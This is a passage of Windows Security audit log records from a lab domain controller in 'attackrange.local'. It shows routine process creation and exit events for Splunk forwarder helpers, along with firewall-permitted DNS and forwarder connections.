	Source Port:		51181
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382061
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		51181
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:53:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382060
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		51181
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:02 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382059
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1604
	Process Name:	C:\Windows\System32\dllhost.exe
	Exit Status:	0x0
03/01/2021 10:53:04 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382063
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55111
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:04 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382062
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55111
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382065
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x112c
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe
	Exit Status:	0x1
03/01/2021 10:53:05 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382064
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x112c
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-admon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382068
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x22b8
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382067
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1ab4
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe
	Exit Status:	0x1
03/01/2021 10:53:06 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382066
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1ab4
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382073
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61483
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382072
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382071
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382070
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382069
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x22b8
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe
	Exit Status:	0x1
03/01/2021 10:53:08 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382074
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382079
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1110
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Exit Status:	0x1
03/01/2021 10:53:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382078
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1110
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382077
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55112
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382076
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55112
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382075
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59283
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:11 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382080
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59559
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382083
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x23dc
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382082
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1104
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Exit Status:	0x1
03/01/2021 10:53:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382081
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1104
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe" --ps2

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382086
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1f2c
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe
	Exit Status:	0x1
03/01/2021 10:53:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382085
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1f2c
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382084
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x23dc
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe
	Exit Status:	0x1
03/01/2021 10:53:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382089
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59732
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382088
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55113
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382087
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55113
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382094
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61560
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382093
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		51573
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382092
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		51573
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382091
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		51573
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382090
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		51573
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:18 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382096
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		51573
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:53:18 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
